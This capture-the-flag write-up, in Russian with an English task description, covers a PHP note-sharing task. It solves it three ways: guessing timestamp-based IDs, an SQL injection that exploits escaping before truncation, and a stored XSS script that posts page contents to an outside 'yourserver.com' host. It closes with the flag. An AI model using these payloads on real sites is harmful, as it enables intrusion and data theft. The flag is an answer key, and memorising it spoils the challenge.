# Dog storage

_Server sources will be posted soon_

> Dog Association has invented service where you can store any information and share link with your friend!
>
> It's really interesting, but we think it's secure so they can transfer important information.
>
> Check it for any useful notes.
>
> _Hint:_ what happens if <code>id</code> will have non-standard length or contain non-standard symbols? Try append some symbols to left or right side of ID of existing note

## Write-up
Есть три различных способа решения этого таска:

### Случайные строки
Случайная строка, называемая `id`, получалась ненадежным способом — первым в Гугле по запросу `случайная строка php`.
На самом деле, это HEX-представление текущего timestamp. В канале во время проведения появилась информация о том, что
флаг был перезалит. Можно было подобрать правильный `id`, зная время отправки в пределах 1-2 минут.

### SQL-инъекция
Первое, что нужно заметить — длина `id` равна 13 символам.

Второе — при добавлении "мусора" слева пост находится.

Значит, пост обрезается слева до 13 символов.

На самом деле, всё ещё хуже: сначала строка экранируется, а только потом обрезается.
Таким образом, можно подобрать строку запроса так, чтобы апостроф заэкранировался, а слеш перед ним "обрезался" на следующем шаге.

Подходящей инъекцией является `' or 11>1 -- ` (пробел на конце обязателен).

### XSS
Заметим, что никакие теги не экранируются вообще.

Можно предположить, что кто-то решит таск (например, жюри проверит работоспособность таска).

Поднимем свой сервер, который запоминает данные со всех пришедших запросов (например, в файле).

Загрузим скрипт, который отправляет содержимое страницы POST-запросом на сервер:

```javascript
<script src="https://code.jquery.com/jquery-3.1.js"></script>
<script>
  $(document).ready(function(){
    $.post('http://yourserver.com/', {'page': $('html').html()}, function(){alert('You hacked haha');});
  });
</script>
```

Ждем, пока кто-то откроет все посты и отправляем флаг

Флаг: `uctfrealescapeisunsafe`
